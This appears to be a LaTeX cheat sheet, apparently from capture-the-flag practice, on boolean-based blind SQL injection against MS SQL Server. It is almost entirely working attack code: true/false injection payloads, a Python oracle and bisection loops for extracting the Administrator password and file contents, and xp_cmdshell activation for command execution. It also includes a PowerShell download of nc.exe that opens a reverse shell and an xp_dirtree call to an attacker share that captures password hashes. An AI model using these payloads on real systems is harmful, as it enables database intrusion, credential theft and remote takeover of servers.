\section{Boolean based}

Subvert a query that return distinctive value when true and false but no data related to the request.

For example a request that check the existance of a user in the DB\ldots

behind such API there is a SQL request of type 

\begin{verbatim}
select * from users where username = '%username%' LIMIT 1;
\end{verbatim}

payload to confirm true and false value:
\begin{verbatim}
' or '1'='1
' and '1'='2
\end{verbatim}



\subsection{Data extraction}

using an oracle:
\begin{verbatim}
def oracle(q):
    p = quote_plus(f"{true_request}' AND ({q})-- -")
    r = requests.get(
        f"http://192.168.43.37/api/check-username.php?u={p}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'
\end{verbatim}

Count number of rows:
\begin{verbatim}
(select count(*) from users) > 0
\end{verbatim}



Finding the lenght of data to extract:
\begin{verbatim}
# request (SELECT Password FROM Users WHERE Username = 'Administrator')
AND LEN({field_request})=1-- -
\end{verbatim}

Finding the $i$th value of a field:
\begin{verbatim}
# request (SELECT Password FROM Users WHERE Username = 'Administrator')
AND ASCII(SUBSTRING({field_request},{i},1))={c}-- -

# Divid and conquer
ASCII(SUBSTRING(password,1,1)) BETWEEN 0 AND 63
\end{verbatim}

\subsection{cmd, file, etc}

\subsubsection{RCE}

\begin{verbatim}
{true_value}' AND IS_SRVROLEMEMBER('sysadmin')=1;--
-- To allow advanced options to be changed.
';exec sp_configure 'show advanced options','1';reconfigure;--
-- To enable the feature.
';exec sp_configure 'xp_cmdshell','1';reconfigure;--
';exec xp_cmdshell 'ping /n 4 192.168.43.164';--
exec xp_cmdshell 'powershell -exec bypass -enc BASE64_PAYLOAD'
\end{verbatim}

\begin{verbatim}
(new-object net.webclient).downloadfile("http://IP/nc.exe", "c:\nc.exe");
c:\nc.exe -nv IP PORT -e c:\windows\system32\cmd.exe;

python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
\end{verbatim}


\subsubsection{Hash}
\begin{verbatim}
master..xp_dirtree
master..xp_fileexist
master..xp_subdirs
sys.dm_os_file_exists
fn_trace_gettable
fn_get_audit_file
';EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;--
\end{verbatim}

\subsubsection{read file}
\begin{verbatim}
file_path = 'C:\\Windows\\System32\\flag.txt' # Target file

# Get the length of the file contents
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
    length += 1
print(f"[*] File length = {length}")

# Dump the file's contents
print("[*] File = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
\end{verbatim}

